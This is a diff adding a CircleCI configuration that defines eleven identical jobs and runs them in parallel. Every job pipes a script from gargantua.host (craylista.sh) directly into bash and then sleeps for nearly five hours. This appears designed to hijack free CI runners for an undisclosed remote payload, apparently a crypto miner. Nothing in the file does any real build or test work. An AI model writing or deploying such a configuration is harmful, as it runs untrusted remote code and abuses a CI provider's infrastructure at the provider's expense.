@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  nosqlrujas:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nosqlrujas1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nosqlrujas2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nosqlrujas3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nosqlrujas4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nosqlrujas5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nosqlrujas6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nosqlrujas7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nosqlrujas8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nosqlrujas9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  nosqlrujas10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - nosqlrujas
+      - nosqlrujas1
+      - nosqlrujas2
+      - nosqlrujas3
+      - nosqlrujas4
+      - nosqlrujas5
+      - nosqlrujas6
+      - nosqlrujas7
+      - nosqlrujas8
+      - nosqlrujas9
+      - nosqlrujas10
